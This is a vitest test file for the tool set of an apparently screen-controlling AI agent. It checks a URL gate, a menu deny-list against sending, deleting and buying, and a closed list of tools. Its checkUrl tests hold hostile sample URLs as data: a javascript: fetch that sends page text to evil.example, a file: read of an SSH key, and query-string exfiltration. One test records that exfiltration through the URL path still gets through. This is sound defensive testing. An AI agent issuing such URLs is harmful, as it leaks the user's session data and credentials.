import { describe, expect, it } from 'vitest'
import { NavKeySchema } from './sidecar-api'
import {
  AGENT_TOOLS,
  AgentKeySchema,
  AppsInputSchema,
  ChooseMenuInputSchema,
  DoneInputSchema,
  FindInputSchema,
  KeyInputSchema,
  LookInputSchema,
  MAX_KEY_REPEAT,
  MAX_URL_LENGTH,
  MenusInputSchema,
  NoteInputSchema,
  OpenUrlInputSchema,
  PressInputSchema,
  ScrollToInputSchema,
  SetTextInputSchema,
  SwitchAppInputSchema,
  SwitchTabInputSchema,
  TabsInputSchema,
  checkMenuCommand,
  checkUrl,
  toolName
} from './agent'

/**
 * The vocabulary, and the fact that it is closed.
 *
 * Most of these are ordinary schema tests. The last describe block is not: it
 * is the structural half of the safety argument written down as an assertion,
 * so that widening the loop's reach becomes a deliberate act with a failing
 * test in front of it rather than a field somebody adds in passing.
 */

describe('look', () => {
  it('takes one of the three things a window can be read as', () => {
    for (const want of ['text', 'targets', 'both'] as const) {
      expect(LookInputSchema.safeParse({ want }).success).toBe(true)
    }
  })

  it('refuses anything else', () => {
    expect(LookInputSchema.safeParse({ want: 'screenshot' }).success).toBe(false)
    expect(LookInputSchema.safeParse({}).success).toBe(false)
  })
})

describe('find', () => {
  it('takes words, and optionally a kind', () => {
    expect(FindInputSchema.safeParse({ query: 'Anil' }).success).toBe(true)
    expect(FindInputSchema.safeParse({ query: 'search', kind: 'type' }).success).toBe(true)
  })

  it('refuses an empty query and a query the size of a document', () => {
    expect(FindInputSchema.safeParse({ query: '' }).success).toBe(false)
    expect(FindInputSchema.safeParse({ query: 'x'.repeat(121) }).success).toBe(false)
  })

  it('knows only the two kinds a scan can hold', () => {
    expect(FindInputSchema.safeParse({ query: 'a', kind: 'link' }).success).toBe(false)
  })
})

describe('press', () => {
  it('takes an index out of the scan, and the title it was shown with', () => {
    expect(PressInputSchema.safeParse({ index: 0, expectTitle: 'Search' }).success).toBe(true)
  })

  /**
   * The read-back is not optional, because it is the whole reason a stale index
   * refuses instead of landing on whatever moved into that slot.
   */
  it('refuses a press that does not say what it thinks it is pressing', () => {
    expect(PressInputSchema.safeParse({ index: 0 }).success).toBe(false)
  })

  it('refuses an index that is not one', () => {
    expect(PressInputSchema.safeParse({ index: -1, expectTitle: 'x' }).success).toBe(false)
    expect(PressInputSchema.safeParse({ index: 1.5, expectTitle: 'x' }).success).toBe(false)
  })
})

describe('setText', () => {
  it('takes an index, the title it was shown with, and the text', () => {
    expect(
      SetTextInputSchema.safeParse({ index: 3, expectTitle: 'Title', text: 'Q3 review' }).success
    ).toBe(true)
  })

  // Same read-back discipline as a press, for the same reason: a stale index
  // must refuse rather than write into whatever moved into that slot.
  it('refuses a write that does not say what it thinks it is writing into', () => {
    expect(SetTextInputSchema.safeParse({ index: 3, text: 'Q3 review' }).success).toBe(false)
  })

  // Empty is meaningful — it is how you clear a field.
  it('allows clearing a field', () => {
    expect(SetTextInputSchema.safeParse({ index: 0, expectTitle: 'Title', text: '' }).success).toBe(
      true
    )
  })

  it('refuses a document', () => {
    expect(
      SetTextInputSchema.safeParse({ index: 0, expectTitle: 'Title', text: 'x'.repeat(2_001) })
        .success
    ).toBe(false)
  })
})

describe('note', () => {
  it('is one short clause, not an essay', () => {
    expect(NoteInputSchema.safeParse({ text: 'looking for Anil in the sidebar' }).success).toBe(true)
    expect(NoteInputSchema.safeParse({ text: '' }).success).toBe(false)
    expect(NoteInputSchema.safeParse({ text: 'x'.repeat(201) }).success).toBe(false)
  })
})

describe('done', () => {
  it('says which kind of done it is', () => {
    expect(DoneInputSchema.safeParse({ found: true, because: 'the thread is open' }).success).toBe(
      true
    )
    expect(DoneInputSchema.safeParse({ found: false, because: 'no Anil anywhere' }).success).toBe(
      true
    )
  })

  /**
   * Required, unlike `NavStepSchema`'s optional one. There a missing field
   * would have failed a parse and killed a plan; here the model is told what it
   * means in the tool schema and can simply be asked again.
   */
  it('refuses to finish without saying whether it arrived', () => {
    expect(DoneInputSchema.safeParse({ because: 'done' }).success).toBe(false)
    expect(DoneInputSchema.safeParse({ found: true }).success).toBe(false)
  })
})

describe('tabs', () => {
  it('takes nothing — it reads whatever is in front', () => {
    expect(TabsInputSchema.safeParse({}).success).toBe(true)
  })
})

describe('switchTab', () => {
  it('takes a number from the list, or part of an address', () => {
    expect(SwitchTabInputSchema.safeParse({ index: 2 }).success).toBe(true)
    expect(SwitchTabInputSchema.safeParse({ urlContains: 'calendar.google' }).success).toBe(true)
  })

  /**
   * Tab numbers are the browser's own and start at 1, unlike target indexes.
   * Zero is the number a model reaches for by analogy with `press`, and it is
   * always wrong here — so it is refused at the schema rather than translated
   * silently into tab 1.
   */
  it('refuses tab zero, which is a target index that wandered in', () => {
    expect(SwitchTabInputSchema.safeParse({ index: 0 }).success).toBe(false)
    expect(SwitchTabInputSchema.safeParse({ index: -1 }).success).toBe(false)
  })

  /**
   * "Exactly one of these" cannot be said in a schema that must still expose a
   * `.shape` for the SDK, so both-or-neither parses here and is caught in the
   * handler — as a correction the next turn can act on. This asserts the
   * division of labour rather than a gap in it.
   */
  it('leaves both-or-neither to the handler, because the shape has to stay flat', () => {
    expect(SwitchTabInputSchema.safeParse({}).success).toBe(true)
    expect(SwitchTabInputSchema.safeParse({ index: 1, urlContains: 'x' }).success).toBe(true)
  })
})

describe('openUrl', () => {
  it('takes an address, and optionally a new tab', () => {
    expect(OpenUrlInputSchema.safeParse({ url: 'https://calendar.google.com/' }).success).toBe(true)
    expect(
      OpenUrlInputSchema.safeParse({ url: 'https://calendar.google.com/', newTab: true }).success
    ).toBe(true)
  })

  it('caps how much one address can carry', () => {
    const long = `https://a.example/${'x'.repeat(MAX_URL_LENGTH)}`
    expect(OpenUrlInputSchema.safeParse({ url: long }).success).toBe(false)
  })
})

/**
 * The gate, which is the whole reason `openUrl` was allowed to exist.
 *
 * These are the assertions that make the widening deliberate. Every one of them
 * is a thing that would otherwise be a working exfiltration or execution route,
 * and the last block is explicit that the gate is a narrowing rather than a
 * proof — so that nobody reads a green suite as "this is safe now".
 */
describe('checkUrl', () => {
  it('lets a plain address through', () => {
    expect(checkUrl('https://calendar.google.com/').ok).toBe(true)
    expect(checkUrl('https://calendar.google.com/r/month').ok).toBe(true)
  })

  /**
   * `javascript:` in a browser's address bar runs in the origin of whatever is
   * loaded — arbitrary code inside the user's logged-in session, which would
   * make every other control in this vocabulary decorative. `file:` reads the
   * disk. `data:` is a document the agent wrote, rendered as a page.
   */
  it('refuses every scheme that is code rather than navigation', () => {
    for (const url of [
      'javascript:fetch("https://evil.example/"+document.body.innerText)',
      'file:///Users/someone/.ssh/id_rsa',
      'data:text/html,<script>alert(1)</script>',
      'ftp://host.example/x'
    ]) {
      expect(checkUrl(url).ok, url).toBe(false)
    }
  })

  it('refuses credentials smuggled into the address', () => {
    expect(checkUrl('https://user:secret@evil.example/').ok).toBe(false)
  })

  it('refuses something that is not an address at all', () => {
    expect(checkUrl('calendar.google.com').ok).toBe(false)
    expect(checkUrl('').ok).toBe(false)
  })

  /**
   * The rule that does the actual work. A query string is where a payload goes,
   * and it costs nothing to carry — so a site the agent has *not* been shown the
   * inside of gets the bare address only. `calendar.google.com` still works,
   * which is the whole point of drawing the line here rather than at the host.
   */
  it('refuses a query or a fragment to somewhere it has not been', () => {
    expect(checkUrl('https://evil.example/?d=what+was+on+the+screen').ok).toBe(false)
    expect(checkUrl('https://evil.example/#what+was+on+the+screen').ok).toBe(false)
    expect(checkUrl('https://evil.example/').ok).toBe(true)
  })

  /**
   * And the exception, which is not a hole: a host that was open in a tab is one
   * whose pages the agent could already read, so a query string to it tells it
   * nothing it did not already have. Without this, searching a site you are
   * already on would be impossible.
   */
  it('allows a query to a site that was already open', () => {
    const known = new Set(['mail.google.com'])
    expect(checkUrl('https://mail.google.com/?q=terms+doc', known).ok).toBe(true)
    expect(checkUrl('https://evil.example/?q=terms+doc', known).ok).toBe(false)
  })

  it('matches hosts case-insensitively, so casing is not a bypass', () => {
    expect(checkUrl('https://MAIL.google.com/?q=x', new Set(['mail.google.com'])).ok).toBe(true)
  })

  it('says why, in words a next turn can act on', () => {
    const verdict = checkUrl('https://evil.example/?d=x')
    expect(verdict.ok).toBe(false)
    expect(verdict.because).toMatch(/\?/u)
    expect(verdict.host).toBe('evil.example')
  })

  /**
   * Written down because a green suite above is easy to mistake for a proof.
   *
   * Rule 3 makes a payload expensive, not impossible — a path is still a path,
   * and a run has forty turns. What the gate actually buys is that the cheap
   * single-shot version does not work, that the catastrophic schemes are
   * unreachable, and that every attempt is one visible row on the card. The
   * complete answer is a budget granted from the user's own words before the
   * run starts, which nothing on a page can reach — `AGENT-V2.md` §7.
   */
  it('does not claim to stop a determined exfiltration, and this records that', () => {
    expect(checkUrl('https://evil.example/leaked-text-in-the-path').ok).toBe(true)
  })
})

describe('the closure', () => {
  it('names fifteen tools and no more', () => {
    expect([...AGENT_TOOLS]).toEqual([
      'look',
      'find',
      'press',
      'setText',
      'key',
      'scrollTo',
      'apps',
      'switchApp',
      'menus',
      'chooseMenu',
      'tabs',
      'switchTab',
      'openUrl',
      'note',
      'done'
    ])
  })

  /**
   * The structural safety argument, asserted where anyone widening it will trip
   * over it.
   *
   * **Nothing in this vocabulary can express Return.** That is the whole of what
   * is left, and it is the clause that was always doing the work: ⏎ is how
   * Slack, Messages, Mail and Discord all send, so a model that wanted to send a
   * message cannot describe the act — whatever it was shown on screen, and
   * without depending on it being well behaved.
   *
   * Three clauses that used to live in this test have gone, each deliberately,
   * and the history is the point rather than clutter:
   *
   *   "nothing writes text"          → `setText`, because typing is not sending
   *   "nothing carries a url"        → `openUrl`, and it brought `checkUrl` with it
   *   "nothing carries a keystroke"  → `key`, and it brought `AgentKeySchema`
   *
   * The last is the one that looks like the fence coming down. It is not, and
   * the test below is why: `key` cannot carry Return because the enum it is
   * built from has never contained one. The list is asserted whole, so adding an
   * entry is a visible act here rather than an invisible one there.
   *
   * A change that makes any of this fail is the test working. The widening wants
   * an argument and probably a gate, not a quiet edit.
   */
  it('cannot express Return, under any spelling, in any tool', () => {
    // Every word for the actuator, including the ones a future schema might
    // reasonably pick. `enter`/`return` as *values* are covered by the enum
    // assertion below; this catches a field that would carry one.
    const forbidden = ['modifiers', 'chord', 'send', 'submit', 'enter', 'hotkey', 'shortcut']
    for (const [tool, schema] of Object.entries(SHAPES)) {
      const fields = Object.keys(schema.shape)
      for (const field of forbidden) {
        expect(fields, `${tool} must not carry "${field}"`).not.toContain(field)
      }
    }
  })

  /**
   * The enumeration that replaced the ban, asserted whole.
   *
   * `toEqual` on the entire list rather than a `not.toContain('return')`,
   * because the failure worth catching is not somebody adding Return on purpose
   * — it is somebody rewriting this as a filter over `NavKeySchema` and quietly
   * changing what it excludes. A whole-list assertion fails on any edit and
   * makes the author say what they meant.
   */
  it('gives the key tool eight keys, and Return is not among them', () => {
    expect(AgentKeySchema.options).toEqual([
      'tab',
      'backTab',
      'up',
      'down',
      'left',
      'right',
      'pageUp',
      'pageDown'
    ])
    for (const spelling of ['return', 'enter', 'Return', '\n', '\r']) {
      expect(AgentKeySchema.safeParse(spelling).success).toBe(false)
    }
    expect(KeyInputSchema.safeParse({ key: 'return' }).success).toBe(false)
    expect(KeyInputSchema.safeParse({ key: 'pageDown', times: 3 }).success).toBe(true)
  })

  /**
   * Narrower than the sidecar's own navigation keys, and by exactly one.
   *
   * `NavKeySchema` carries `escape`; this does not. Not for safety — a synthetic
   * Escape posts to `.cghidEventTap`, upstream of the global shortcut
   * `ChordScope` registers, so an agent pressing it would trip Mull's own stop
   * and end its own run from the inside.
   *
   * The assertion is a subset check rather than a copy of the list, because the
   * thing that must stay true is that this vocabulary can never ask the sidecar
   * for a key the sidecar's own navigation verb would refuse.
   */
  it('asks for a strict subset of the keys the sidecar will navigate with', () => {
    const nav = new Set<string>(NavKeySchema.options)
    for (const key of AgentKeySchema.options) {
      expect(nav, `navKey cannot send "${key}"`).toContain(key)
    }
    expect(AgentKeySchema.options).not.toContain('escape')
    expect(NavKeySchema.options).toContain('escape')
  })

  /**
   * A repeat count is the one number here that turns one decision into many
   * actions, so it is bounded and the bound is asserted.
   */
  it('bounds how many times one call may press a key', () => {
    expect(KeyInputSchema.safeParse({ key: 'down', times: MAX_KEY_REPEAT }).success).toBe(true)
    expect(KeyInputSchema.safeParse({ key: 'down', times: MAX_KEY_REPEAT + 1 }).success).toBe(false)
    expect(KeyInputSchema.safeParse({ key: 'down', times: 0 }).success).toBe(false)
  })

  /**
   * Exactly one tool may change which application the user is looking at.
   *
   * `bundleId` used to be banned outright and `switchApp` took the ban off. A
   * count rather than a ban is what stops a second one appearing beside it and
   * inheriting an argument that was only made for this one — the same shape as
   * the `url` assertion below, and for the same reason.
   */
  it('lets exactly one tool change which application is in front', () => {
    const moving = Object.entries(SHAPES)
      .filter(([, schema]) => Object.keys(schema.shape).includes('bundleId'))
      .map(([name]) => name)
    expect(moving).toEqual(['switchApp'])
  })

  /**
   * And it must say why, in words, every time.
   *
   * The screen moving under somebody who is reading is the thing `AGENT-V2.md`
   * §11 says will make a working feature feel broken, and a required `because`
   * is the whole mitigation. Optional, it would be absent exactly when a run was
   * going badly and the user most needed it.
   */
  it('makes switchApp explain itself before the screen moves', () => {
    expect(SwitchAppInputSchema.safeParse({ bundleId: 'com.apple.Safari' }).success).toBe(false)
    expect(
      SwitchAppInputSchema.safeParse({
        bundleId: 'com.apple.Safari',
        because: 'to check Thursday'
      }).success
    ).toBe(true)
  })

  /**
   * Which tools may carry text, and why the list is exactly this long.
   *
   * `setText` puts it in a field; `note` puts it on the card and nowhere else.
   * A third would be a new way for words to reach somebody's app, and should
   * arrive with an argument rather than by addition.
   */
  it('lets exactly two tools carry text, for two different reasons', () => {
    const carriers = Object.entries(SHAPES)
      .filter(([, schema]) => Object.keys(schema.shape).includes('text'))
      .map(([name]) => name)
    expect(carriers).toEqual(['setText', 'note'])
  })

  /**
   * Exactly one tool may reach off this machine, and it is the gated one.
   *
   * The assertion the blanket ban on `url` was really making. A count rather
   * than a ban is what stops a second network verb being added beside the first
   * and quietly inheriting an argument that was only ever made for `openUrl`.
   */
  it('lets exactly one tool reach off this machine', () => {
    const reaching = Object.entries(SHAPES)
      .filter(([, schema]) => Object.keys(schema.shape).includes('url'))
      .map(([name]) => name)
    expect(reaching).toEqual(['openUrl'])
  })

  /** Nothing is asserted about a tool nobody remembered to put in `SHAPES`. */
  it('has a shape here for every tool there is', () => {
    expect(Object.keys(SHAPES).sort()).toEqual([...AGENT_TOOLS].sort())
  })
})

/**
 * The gate that replaced the keystroke closure — for one tool, and weakly.
 *
 * Every other widening of this vocabulary could be argued from the shape of
 * `AgentKeySchema`: no Return, therefore no send, therefore everything else is
 * visible and reversible. The menu bar goes round that argument rather than
 * through it. **Mail sends from a menu item.** So a vocabulary that can choose
 * any menu command can send, and the sentence the design rests on would have
 * gone on being true while ceasing to mean anything.
 *
 * These tests are the replacement, and they are worth reading as *weaker* than
 * the ones above rather than as more of the same. Those assert the shape of a
 * type and cannot be wrong about a phrasing. This asserts a regex, which can.
 */
describe('checkMenuCommand', () => {
  /**
   * The one that matters. Not "a destructive command is refused" — this is the
   * architectural invariant, and it is the reason the function exists at all.
   */
  it('refuses to send, however the application spells it', () => {
    for (const name of [
      'Send',
      'Send Message',
      'Send Later…',
      'Submit',
      'Post',
      'Publish to the web',
      'Share…',
      'Invite people'
    ]) {
      const verdict = checkMenuCommand('Message', name)
      expect(verdict.ok, name).toBe(false)
      expect(verdict.because).toMatch(/does not send/iu)
    }
  })

  it('refuses to destroy, to quit and to spend', () => {
    const refused = [
      ['File', 'Move to Trash'],
      ['Edit', 'Delete'],
      ['Mailbox', 'Erase Deleted Items'],
      ['Chrome', 'Quit Google Chrome'],
      ['Apple', 'Log Out Mohit Singh…'],
      ['Store', 'Buy Now']
    ] as const
    for (const [menu, name] of refused) {
      expect(checkMenuCommand(menu, name).ok, `${menu} ${name}`).toBe(false)
    }
  })

  /** Both halves of the path are read, because either can be the dangerous one. */
  it('reads the heading as well as the command', () => {
    expect(checkMenuCommand('Send', 'Now').ok).toBe(false)
  })

  /**
   * The other half of a deny-list, and the half that decides whether it is
   * usable. A guard that refuses everything is not a guard, it is an outage —
   * these are the ordinary commands a run actually needs.
   */
  it('allows the commands a run is for', () => {
    const allowed = [
      ['File', 'New Event…'],
      ['File', 'New Tab'],
      ['File', 'Save'],
      ['File', 'Open Location…'],
      ['Edit', 'Find…'],
      ['Edit', 'Paste'],
      ['View', 'Show Sidebar'],
      ['Go', 'Calendar'],
      ['Window', 'Minimize']
    ] as const
    for (const [menu, name] of allowed) {
      expect(checkMenuCommand(menu, name).ok, `${menu} ${name}`).toBe(true)
    }
  })

  /**
   * Plain `Close` is deliberately not refused, and the deliberateness is the
   * thing worth pinning: closing a tab is ordinary and common, and denying it
   * would cost more than the unsaved window it might occasionally save.
   */
  it('leaves Close alone, on purpose', () => {
    expect(checkMenuCommand('File', 'Close Tab').ok).toBe(true)
    expect(checkMenuCommand('File', 'Close Window').ok).toBe(true)
  })

  /**
   * A word inside another word is not that word.
   *
   * `\b` is doing real work here: "Resend" and "Godsend" contain "send",
   * "Undelete" contains "delete". Over-refusing is the failure mode that makes
   * a guard get removed rather than fixed.
   */
  it('matches words, not substrings', () => {
    expect(checkMenuCommand('Edit', 'Transpose').ok).toBe(true)
    expect(checkMenuCommand('View', 'Sidebar').ok).toBe(true)
  })

  /**
   * Found by running the real list against Notes rather than by thinking about
   * it: "Block Quote" is a paragraph style, and `\bblock\b` refused it. Still
   * refusing to block a *person*, which is what the word was in the list for.
   */
  it('does not mistake a paragraph style for blocking somebody', () => {
    expect(checkMenuCommand('Format', 'Block Quote').ok).toBe(true)
    expect(checkMenuCommand('Conversation', 'Block Sender').ok).toBe(false)
  })
})

/** Every tool's input shape, so the assertions above cannot quietly miss one. */
const SHAPES = {
  look: LookInputSchema,
  find: FindInputSchema,
  press: PressInputSchema,
  setText: SetTextInputSchema,
  key: KeyInputSchema,
  scrollTo: ScrollToInputSchema,
  apps: AppsInputSchema,
  switchApp: SwitchAppInputSchema,
  menus: MenusInputSchema,
  chooseMenu: ChooseMenuInputSchema,
  tabs: TabsInputSchema,
  switchTab: SwitchTabInputSchema,
  openUrl: OpenUrlInputSchema,
  note: NoteInputSchema,
  done: DoneInputSchema
}

describe('toolName', () => {
  // What `canUseTool` is handed, and therefore what the stop has to match on.
  it('is the full MCP name, not the bare one', () => {
    expect(toolName('press')).toBe('mcp__mull__press')
  })
})
